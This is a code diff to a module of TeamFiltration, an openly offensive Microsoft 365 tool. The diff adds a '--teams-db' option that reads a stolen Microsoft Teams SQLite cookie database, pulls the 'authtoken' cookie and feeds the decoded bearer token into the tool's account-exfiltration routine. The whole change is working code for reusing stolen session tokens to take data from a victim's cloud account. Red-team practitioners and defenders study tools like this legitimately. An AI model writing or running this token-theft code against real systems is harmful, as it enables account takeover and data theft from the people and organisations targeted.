@@ -22,6 +22,8 @@ using System.Text;
 using System.IdentityModel.Tokens.Jwt;
 using System.Threading;
 using MoreLinq;
+using System.Data.SQLite;
+using System.Web;
 
 namespace TeamFiltration.Modules
 {
@@ -204,6 +206,29 @@ namespace TeamFiltration.Modules
                 }
 
 
+            }
+            else if (args.Contains("--teams-db"))
+            {
+                Console.WriteLine("[+] Reading exfiltrated Teams database");
+
+                string filePath = args.GetValue("--teams-db");
+
+                if (File.Exists(filePath) && IsDatabaseFile(filePath))
+                {
+                    string token = ExfilFromLocalTeamsDB(filePath);
+                    if (!string.IsNullOrEmpty(token))
+                    {
+                        await SingleTokenExfilAccountAsync(_globalProperties.OutPutPath, new BearerTokenResp() { access_token = HttpUtility.UrlDecode(token.Split('=')[1].Split('&')[0]) }, exfilOptions, msolHandler);
+                    }
+                    else
+                    {
+                        Console.WriteLine("[!] Could not extract useful token from specified Teams database!");
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("[!] Invalid path given, could not find specified Teams database, or the specified file is not a DB file!");
+                }
             }
             else
             {
@@ -1356,5 +1381,43 @@ namespace TeamFiltration.Modules
 
         }
 
+        private static bool IsDatabaseFile(string filePath)
+        {
+            byte[] bytes = new byte[17];
+            using (FileStream fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+            {
+                fs.Read(bytes, 0, 16);
+            }
+            string chkStr = Encoding.ASCII.GetString(bytes);
+            if (chkStr.Contains("SQLite format"))
+            {
+                return true;
+            }
+            return false;
+        }
+
+        private static string ExfilFromLocalTeamsDB(string filePath)
+        {
+            SQLiteConnection sqliteConnection = new SQLiteConnection($"Data Source={filePath}; Version = 3; New = True; Compress = True;");
+            string token = "";
+            try
+            {
+                sqliteConnection.Open();
+                SQLiteCommand cmd = sqliteConnection.CreateCommand();
+                cmd.CommandText = "SELECT value FROM cookies WHERE name = 'authtoken';";
+                using (var reader = cmd.ExecuteReader())
+                {
+                    while (reader.Read())
+                    {
+                        token = reader.GetString(0);
+                    }
+                }
+                return token;
+            }
+            catch (Exception)
+            {
+                throw;
+            }
+        }
     }
 }
